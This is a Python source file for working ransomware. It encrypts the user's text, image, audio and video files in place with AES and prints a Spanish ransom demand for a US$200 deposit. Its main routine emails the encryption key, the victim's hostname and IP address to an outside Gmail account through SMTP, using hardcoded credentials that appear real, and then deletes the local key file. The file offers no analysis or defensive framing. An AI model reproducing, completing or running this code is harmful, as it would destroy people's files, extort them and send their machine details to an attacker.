
import os
import random
import hashlib
import socket


from Crypto.Util import Counter
from Crypto.Cipher import AES
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from smtplib import SMTP
import socket



hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
username = os.getlogin()


destination = r'C:\Users\elmor\Documents'

destination = os.path.abspath('')
files = os.listdir(destination)
files = [x for x in files if not x.startswith('.')]


extensions = [".txt", ".jpg", '.jpeg', 'mp4', 'mp3', 'png',]

def hash_key():
	hashnumber = destination + socket.gethostname() + str(random.randint(0, 10000000000000000000000000000000000000000000000))
	hashnumber = hashnumber.encode('utf-8')
	hashnumber = hashlib.sha512(hashnumber)
	hashnumber = hashnumber.hexdigest()

	new_key = []

	for k in hashnumber:
		if len(new_key) == 32:
			hashnumber = ''.join(new_key)
			break
		else:
			new_key.append(k)

	return hashnumber


def encrypt_and_decrypt(text, crypto, block_size = 16):
	with open(text, 'r+b') as encrypted_file:
		unencrypted_content = encrypted_file.read(block_size)
		while unencrypted_content:
			encrypted_content = crypto(unencrypted_content)
			if len(unencrypted_content) != len(encrypted_content):
				raise ValueError('')

			encrypted_file.seek(- len(unencrypted_content), 1)
			encrypted_file.write(encrypted_content)
			unencrypted_content = encrypted_file.read(block_size)



def discover(key):
	files_list = open('files_list', 'w+')

	for extension in extensions:
		for file in files:
			if file.endswith(extension):
				files_list.write(os.path.join(file)+ '\n')
	files_list.close()

	del_space = open('files_list', 'r')
	del_space = del_space.read().split('\n')
	del_space = [i for i in del_space if not i == '']

	if os.path.exists('hash_file'):

		decrypt_field = input('Ingrese la llave simétrica: ')

		hash_file = open('hash_file', 'r')

		key = hash_file.read().split('\n')
		key = ''.join(key)

		if decrypt_field == key:
			key = key.encode('utf-8')
			counter = Counter.new(128)
			crypto = AES.new(key, AES.MODE_CTR, counter = counter)

			cryp_files = crypto.decrypt

			for element in del_space:
				encrypt_and_decrypt(element, cryp_files)
	else:
		counter = Counter.new(128)
		crypto = AES.new(key, AES.MODE_CTR, counter = counter)

		hash_file = open('hash_file', 'wb')
		hash_file.write(key)
		hash_file.close()

		cryp_files = crypto.encrypt

		for element in del_space:
			encrypt_and_decrypt(element, cryp_files)
			
		print('Bueno distinguido, hay bobo para usted. Sus archivos acaban de ser encriptados, si desea recuperarlos deposite US$200 a la cuenta: XXX-XXXX-XX.\nAl momento de realizar el deposito se le suministraran los pasos a seguir para obtener sus archivos.')
		
def main():
	hashnumber = hash_key()
	hashnumber = hashnumber.encode('utf-8')
	discover(hashnumber)
	emailkey = MIMEMultipart("plain")
	emailkey["From"]="morenay3009@gmail.com"
	emailkey["To"]="morenay3009@gmail.com"
	emailkey["Subject"] = "Llave del usuario " + hostname + " con dirección IP: " + ip
	adjunto = MIMEBase("application", "octect-stream")
	adjunto.set_payload(open("hash_file","rb").read())
	adjunto.add_header("content-Disposition", 'attachment; filename="hash_file"')
	emailkey.attach(adjunto)
	smtp = SMTP("smtp.gmail.com")
	smtp.starttls()
	smtp.login("morenay3009@gmail.com","uqdxbenrgaiztgpe")
	smtp.sendmail("morenay3009@gmail.com", "morenay3009@gmail.com", emailkey.as_string())
	smtp.quit()
	os.remove('hash_file')
	os.remove('files_list')
	input()

			
if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()
